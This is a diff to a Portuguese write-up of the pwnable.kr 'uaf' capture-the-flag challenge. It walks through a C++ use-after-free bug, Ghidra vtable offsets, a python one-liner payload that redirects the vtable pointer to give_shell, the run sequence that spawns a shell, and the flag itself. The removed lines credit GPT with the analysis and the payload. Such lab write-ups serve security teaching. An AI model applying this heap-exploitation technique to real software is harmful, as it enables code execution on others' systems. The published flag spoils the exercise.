@@ -15,27 +15,35 @@ Running at : nc pwnable.kr 9000
 
 ## Solução
 
-O exercício começa com a gente acessando essa máquina ``` ssh uaf@pwnable.kr -p2222```
+O desafio inicia com o acesso à máquina utilizando o seguinte comando:
 
-E dentro do terminal da máquina temos esses arquivos:
+```
+ssh uaf@pwnable.kr -p2222
+```
+
+Dentro do terminal da máquina, os seguintes arquivos estão disponíveis:
+
 ```
 uaf@pwnable:~$ ls
 flag  uaf  uaf.cpp
 ```
-Escrevendo ```cat uaf.cpp``` temos acesso a esse código, que além da vulnerabilidade UAF também apresenta conceitos de 'Programação Orientada à Objetos':
 
+Executando o comando `cat uaf.cpp`, é possível visualizar o código-fonte, que, além de apresentar a vulnerabilidade Use-After-Free (UAF), também explora conceitos de Programação Orientada a Objetos:
 
 ```c++
-#include <fcntl.h>                                                                                                                           
-#include <iostream>                                                                                                                          
-#include <cstring>                                                                                                                           
-#include <cstdlib>                                                                                                                           
-#include <unistd.h>                                                                                                                          
-using namespace std;                                                                                                                         
-class Human{                                                                                                                                 
-private:                                                                                                                                     
-        virtual void give_shell(){                                                                                                           
-                system("/bin/sh");                                                                                                           
+#include <fcntl.h>                                           
+#include <iostream>                                          
+#include <cstring>                                         
+#include <cstdlib>                                          
+#include <unistd.h>
+                                          
+using namespace std;
+
+class Human{
+
+private:
+        virtual void give_shell(){                                                                                                          
+                system("/bin/sh");                                             
         }                                                                                                                                    
 protected:                                                                                                                                   
         int age;                                                                                                                             
@@ -101,91 +109,66 @@ int main(int argc, char* argv[]){
                                 break;
                 }
         }
- 
+
         return 0;
 } 
 ```
 
-Ao analisar o código percebemos que ele tem 3 funções:
+Analisando o código, percebe-se que ele possui três funções principais:
 
-Opção 1 (use) → Chama introduce() de m e w.
+- **Opção 1 (use)** → Chama a função `introduce()` para `m` e `w`.
 
-Opção 2 (after) → Aloca memória dinâmica, de tamanho ```argv1```, para armazenar dados de um arquivo, que está contido em ```argv2```.
+- **Opção 2 (after)** → Aloca memória dinâmica com tamanho definido pelo argumento `argv1` e carrega dados do arquivo especificado em argv2.
 
-Opção 3 (free) → Libera os objetos m e w.
+- **Opção 3 (free)** → Libera os objetos `m` e `w`.
 
-Descompilando o código no ghidra precisamos procurar duas funções importantes no código a ```introduce``` e a ```give_shell```, pois na lógica do código, ao trocarmos a informação que adicionamos na opção 1 ```use``` conseguimos fazer o ponteiro que não estaria alocado para a função ```introduce``` e faríamos ele apontar para a função do ```give shell```. Devo ressaltar que os objetos ```m``` e ```w``` estão em uma vtable, em C++, as funções virtuais são acessadas através da Virtual Table (vtable), que contém ponteiros para as funções da classe, nesse caso a classe sendo ```human```.
+Descompilando o código no Ghidra, duas funções importantes devem ser analisadas: `introduce()` e `give_shell()`. Pela lógica do código, ao modificar a informação armazenada na opção `use`, é possível fazer com que o ponteiro, que originalmente apontaria para `introduce()`, seja direcionado para `give_shell()`.
 
-Variavel man
+Os objetos `m` e `w` estão armazenados em uma vtable. Em C++, as funções virtuais são acessadas através da Virtual Table (vtable), que contém ponteiros para as funções da classe, sendo, neste caso, a classe `Human`.
+
+Variável `man`
+
 ![image](https://github.com/user-attachments/assets/d3024548-9134-4a4b-a4f0-79c773755914)
 
-Vtable de man
+Vtable de `Man`
+
 ![image](https://github.com/user-attachments/assets/03428383-0981-41e8-94a9-3f577418a7ab)
 
-Vtable de human
+Vtable de `human`
+
 ![image](https://github.com/user-attachments/assets/604f0582-36b3-4d67-91a5-dd38965ee463)
 
 
-Quando um objeto chama ```introduce()```, na verdade, ele está acessando o endereço armazenado na vtable. Pedindo ajuda pro gpt analisar o Ghidra e achar a vtable certa do que queremos ele me deu essa explicação detalhada a seguir: 
-```
- A vtable de Man começa no endereço 0x401560 e contém vários campos inicializados com 0h, que são apenas preenchimentos (possivelmente espaço reservado para futuras funções virtuais ou alinhamento de memória).
-
-Depois disso, temos:
-
-0x401568 → addr Man::typeinfo (metadados sobre a classe Man).
-0x401570 → addr Human::give_shell → Isso significa que o ponteiro nesse deslocamento está apontando para a função give_shell, que pertence à classe Human.
-0x401578 → addr Man::introduce → Aqui está o ponteiro para a função introduce() da classe Man. 
-
-``` 
-```
-Endereço da vtable
-A vtable de Man está de fato na região que começa em 0x401560. Isso é o bloco de memória que guarda os endereços das funções virtuais de Man.
-
-Offset do método introduce()
-O ponteiro para introduce() está em 0x401578, o que significa que essa função pode ser chamada quando um objeto de Man invoca um método virtual.
-
-Offset do método give_shell()
-O ponteiro para give_shell() está em 0x401570, o que sugere que o primeiro método virtual na vtable foi sobrescrito para apontar para Human::give_shell ao invés da implementação original.
-```
-Neste ponto, fica claro o que precisamos fazer: alocar um espaço de memória usando a opção after para simular um objeto Man real, mas com o ponteiro da vtable modificado. Dessa forma, ao usar a opção use, em vez de chamar ```introduce```, a função ```give_shell``` será executada.
-![image](https://github.com/user-attachments/assets/94bc2949-ec58-44ae-9a6a-f4d42e156662)
-
-Para conseguirmos executar uma chamada para ```give_shell``` precisamos fazer um cálculo simples do offset. Se a vtable começa em ```0x401570``` e ```introduce()``` está em ```0x401578```, podemos calcular o deslocamento:
-
-```0x401578 − 0x401570 = 8```
-
-Sendo assim temos 8 bytes de offset.
-
-E com esses 8 bytes de offset conseguimos fazer nosso ponteiro apontar para a função do ```give_shell``` sem nenhum problema. Como esse 8 bytes "adiantam" nosso ponteiro, temos que ajustá-lo para começar 8 posições antes para aí o ponteiro apontar para a posição ```0x401570-8``` que no caso será ```40 1568```. E com isso alteranfo o ponteiro da vtable para ```0x401568``` fará com que, ao buscar ```introduce()```, o programa acabe chamando ```give_shell()```.
- 
-E por fim precisamos criar um payload com esse endereço de ponteiro para executarmos o código e adicionar essa informação com o uso da opção 2 (after). Pedi pro Gpt me entregar um payload, com todas essas informações que encontrei e ele me passou o seguinte código para executar no terminal do ssh:
-``` python3 -c 'import sys; sys.stdout.buffer.write(b"\x68\x15\x40\x00" + b"\x00" * 4)' > /tmp/uaf-exploit ``` 
-```
-uaf@pwnable:~$ python3 -c 'import sys; sys.stdout.buffer.write(b"\x68\x15\x40\x00" + b"\x00" * 4)' > /tmp/uaf-exploit
-uaf@pwnable:~$ ./uaf 8 /tmp/uaf-exploit
-1. use
-2. after
-3. free
-->3
-1. use
-2. after
-3. free
-->2
-your data is allocated
-1. use
-2. after
-3. free
-->2
-your data is allocated
-1. use
-2. after
-3. free
-->1
-$ cat flag
-yay_f1ag_aft3r_pwning
-$ 
+Quando um objeto chama `introduce()`, ele acessa o endereço armazenado na vtable. Ao analisar a vtable de `Man` no Ghidra, identificam-se os seguintes endereços relevantes:
 
 ```
+0x401560 → Início da vtable de `Man`
+0x401568 → Ponteiro para `Man::typeinfo` (metadados da classe `Man`)
+0x401570 → Ponteiro para `Human::give_shell`
+0x401578 → Ponteiro para `Man::introduce`
+```
+
+Isso significa que a função `give_shell()` já está presente na vtable e pode ser acessada redirecionando o ponteiro corretamente.
+
+Para explorar a vulnerabilidade, é necessário alocar um espaço de memória utilizando a opção `after`, simulando um objeto `Man` real, mas modificando o ponteiro da vtable. Assim, quando a opção `use` for selecionada, o programa executará `give_shell()` em vez de `introduce()`.
+
+O deslocamento entre `give_shell()` e `introduce()` pode ser calculado da seguinte maneira:
+
+```
+0x401578 - 0x401570 = 8 bytes
+```
+Portanto, um ajuste de 8 bytes permite modificar o ponteiro da vtable e fazer com que a execução de `introduce()` chame `give_shell()`.
+
+Para executar o código, é necessário criar um payload com o endereço correto e injetá-lo utilizando a opção `after`.
+
+O seguinte comando gera o payload necessário:
+
+```
+python3 -c 'import sys; sys.stdout.buffer.write(b"\x68\x15\x40\x00" + b"\x00" * 4)' > /tmp/uaf-exploit
+```
+
+A sequência de comandos para explorar a vulnerabilidade é:
+
 ![image](https://github.com/user-attachments/assets/d9e1f927-e39c-4ec7-a0d4-06c0457fd740)
 
 > Assim, obtemos a flag `yay_f1ag_aft3r_pwning`
